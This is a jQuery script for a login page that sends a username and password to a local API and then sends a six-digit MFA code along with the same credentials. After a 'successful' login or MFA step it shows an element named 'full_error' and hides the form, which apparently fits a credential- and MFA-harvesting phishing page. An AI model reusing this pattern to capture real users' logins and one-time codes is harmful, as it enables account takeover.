$(document).ready(function() {
    $("#login").on("input", function() {
        if ($(this).val().length > 0) {
            $(".field_login").addClass('field--non-empty');
        } else {
            $(".field_login").removeClass("field--non-empty");
        }
    });
    $("#password").on("input", function() {
        if ($(this).val().length > 0) {
            $(".field_pass").addClass('field--non-empty');
            if ($("#login").val().length > 0){
                $(".mobile-button__submit").removeClass("mobile-button__submit--disabled");
                $('.mobile-button__submit').attr('disabled', false);
            }
        } else {
            $(".field_pass").removeClass("field--non-empty");
            $(".mobile-button__submit").addClass("mobile-button__submit--disabled");
            $('.mobile-button__submit').attr('disabled', true);
        }
    });
    $("#go").click(function (){
        $("#svg").show();
        $("#go").hide();
        if ($("#type").val() === 'login'){
            login();
        } else if ($("#type").val() === 'mfa'){
            let code = $("#code1").val() + $("#code2").val() + $("#code3").val() + $("#code4").val() + $("#code5").val() + $("#code6").val();
                login_mfa(code);
        }

    });

        var $inputs = $('.codefield__input');


        $inputs.on('keydown', function(event) {
            var keyCode = event.keyCode || event.which;


            if (keyCode == 8) {
                var currentIndex = $inputs.index(this);
                if (currentIndex > 0) {
                    var $prevInput = $inputs.eq(currentIndex - 1);
                    $inputs.eq(currentIndex).removeClass('code_yes');
                    if (currentIndex === 1){
                        $prevInput.removeClass('code_yes');
                    }
                }
            }
            if (keyCode == 8 && this.value.length == 0) {
                $prevInput.focus();
            }
            else if (this.value.length >= 1) {
                $(this).addClass('code_yes');
                var currentIndex = $inputs.index(this);
                if (currentIndex < $inputs.length - 1) {
                    var $nextInput = $inputs.eq(currentIndex + 1);
                    $nextInput.focus();
                }
            }
        });

    var inputs = $(".codefield__input");

    inputs.on('input', function() {
        var filled = true;
        inputs.each(function() {
            if ($(this).val().length === 0) {
                filled = false;
            }
        });
        if (filled) {
            $('.mobile-button__submit').attr('disabled', false);
        } else {
            $('.mobile-button__submit').attr('disabled', true);
        }
    });

    function login(){
        let username = $('#login').val();
        let password = $('#password').val();
        $.ajax({
            url: './api/authorization',
            type: 'POST',
            data: {username, password},
            dataType: 'json',
            success: function(response){
                if (response.ok === 'true'){
                    $("#head1").hide();
                    $("#head3").show();
                    $("#login_form").hide();
                    $("#mfa_email").hide();
                    $("#full_error").show();
                    $("#svg").hide();
                    $("#hui").hide();
                }else if (response.ok === 'false') {
                    $('#error_login').show();
                    $("#svg").hide();
                    $("#go").show();
                } else if (response.ok === 'mfa') {
                    $("#login_form").hide();
                    $("#mfa").show();
                    $("#svg").hide();
                    $("#go").show();
                    $("#head1").hide();
                    $("#head2").show();
                    $("#mail").html(response.email);
                    $("#mfa_email").show();
                    $('.mobile-button__submit').attr('disabled', true);
                    $("#type").val('mfa');
                }
            }
        });
    }
    function login_mfa(code){
        let username = $('#login').val();
        let password = $('#password').val();
        $.ajax({
            url: './api/mfa',
            type: 'POST',
            data: {code, username, password},
            dataType: 'json',
            success: function(response){
                if (response.ok === 'true'){
                    $("#head2").hide();
                    $("#head3").show();
                    $("#mfa").hide();
                    $("#mfa_email").hide();
                    $("#full_error").show();
                    $("#svg").hide();
                    $("#hui").hide();
                }

            }
        });
    }

});